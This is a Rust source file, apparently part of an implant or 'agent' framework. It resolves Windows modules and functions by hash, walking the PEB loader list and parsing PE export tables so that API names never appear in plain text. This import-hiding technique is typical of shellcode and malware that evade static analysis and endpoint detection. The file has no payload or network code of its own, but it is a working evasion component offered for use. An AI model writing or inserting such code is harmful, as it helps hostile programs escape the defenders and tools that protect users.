#![allow(dead_code)]
#![no_std]

include!(concat!(env!("OUT_DIR"), "/api_hashes.rs"));

#[inline(always)]
pub fn hash_str(bytes: &[u8]) -> u32 {
    let mut hash: u32 = SEED;
    for &b in bytes {
        if b == 0 {
            break;
        }
        hash = hash.rotate_right(13) ^ (b.to_ascii_lowercase() as u32);
    }
    hash
}

#[inline(always)]
pub fn hash_wstr(bytes: &[u16]) -> u32 {
    let mut hash: u32 = SEED;
    for &c in bytes {
        if c == 0 {
            break;
        }
        let b = (c as u8).to_ascii_lowercase(); // simplified
        hash = hash.rotate_right(13) ^ (b as u32);
    }
    hash
}

#[cfg(target_arch = "x86_64")]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    asm!("mov {}, gs:[0x30]", out(reg) teb);
    let peb = *(teb as *const usize).add(12) as *const u8;
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while module_list as usize != ldr.add(0x20) as usize {
        let base_dll_name_ptr = *(module_list.add(0x48) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x40) as *const u16) as usize / 2;

        if base_dll_name_ptr != core::ptr::null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

#[cfg(target_arch = "x86_64")]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    let signature = *(nt_headers as *const u32);
    if signature != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return Some(dll_base + func_rva);
        }
    }
    None
}

/// aarch64 Windows: PEB is at TPIDR_EL0 + 0x60 (same TEB layout as x86_64).
/// The LDR module-list walk is identical to the x86_64 path; only the
/// register used to reach the TEB differs (`mrs tpidr_el0` instead of
/// `mov gs:[0x30]`).
#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_module_handle_by_hash(target_hash: u32) -> Option<usize> {
    use core::arch::asm;
    let teb: usize;
    // On aarch64 Windows the TEB pointer is stored in TPIDR_EL0.
    asm!("mrs {}, tpidr_el0", out(reg) teb, options(nostack, nomem));
    // TEB+0x60 → PEB pointer (same offset as x86_64).
    let peb = *(teb as *const usize).add(12) as *const u8; // offset 0x60 / 8 = 12
    let ldr = *(peb.add(0x18) as *const usize) as *const u8;
    let mut module_list = *(ldr.add(0x20) as *const usize) as *const u8;

    while module_list as usize != ldr.add(0x20) as usize {
        let base_dll_name_ptr = *(module_list.add(0x48) as *const usize) as *const u16;
        let base_dll_name_len = *(module_list.add(0x40) as *const u16) as usize / 2;

        if !base_dll_name_ptr.is_null() && base_dll_name_len > 0 {
            let slice = core::slice::from_raw_parts(base_dll_name_ptr, base_dll_name_len);
            if hash_wstr(slice) == target_hash {
                return Some(*(module_list.add(0x20) as *const usize));
            }
        }
        module_list = *(module_list as *const usize) as *const u8;
    }
    None
}

#[cfg(all(target_arch = "aarch64", target_os = "windows"))]
pub unsafe fn get_proc_address_by_hash(dll_base: usize, target_hash: u32) -> Option<usize> {
    // Export directory parsing is identical to x86_64: PE32+ format is the
    // same for both architectures; only the machine type in FileHeader differs.
    let dos_magic = *(dll_base as *const u16);
    if dos_magic != 0x5A4D {
        return None;
    }

    let e_lfanew = *((dll_base + 0x3C) as *const u32) as usize;
    let nt_headers = dll_base + e_lfanew;
    if *(nt_headers as *const u32) != 0x4550 {
        return None;
    }

    let opt_header = nt_headers + 0x18;
    let export_dir_rva = *((opt_header + 0x70) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = dll_base + export_dir_rva;
    let num_names = *((export_dir + 0x18) as *const u32);
    let rva_funcs = *((export_dir + 0x1C) as *const u32) as usize;
    let rva_names = *((export_dir + 0x20) as *const u32) as usize;
    let rva_ords = *((export_dir + 0x24) as *const u32) as usize;

    let names = (dll_base + rva_names) as *const u32;
    let funcs = (dll_base + rva_funcs) as *const u32;
    let ords = (dll_base + rva_ords) as *const u16;

    for i in 0..num_names {
        let name_ptr = (dll_base + (*names.add(i as usize)) as usize) as *const u8;
        let mut name_len = 0usize;
        while *name_ptr.add(name_len) != 0 {
            name_len += 1;
        }

        let slice = core::slice::from_raw_parts(name_ptr, name_len);
        if hash_str(slice) == target_hash {
            let ord = *ords.add(i as usize) as usize;
            let func_rva = *funcs.add(ord) as usize;
            return Some(dll_base + func_rva);
        }
    }
    None
}

/// aarch64 Linux: no PEB equivalent.  Use dl_iterate_phdr via a
/// platform-specific out-of-crate call.  Returning None here keeps the
/// `no_std` constraint; callers that need module handles on aarch64 Linux
/// should use `dlopen`/`dlsym` directly from agent code.
#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(all(target_arch = "aarch64", not(target_os = "windows")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_module_handle_by_hash(_target_hash: u32) -> Option<usize> {
    None
}

#[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
pub unsafe fn get_proc_address_by_hash(_dll_base: usize, _target_hash: u32) -> Option<usize> {
    None
}
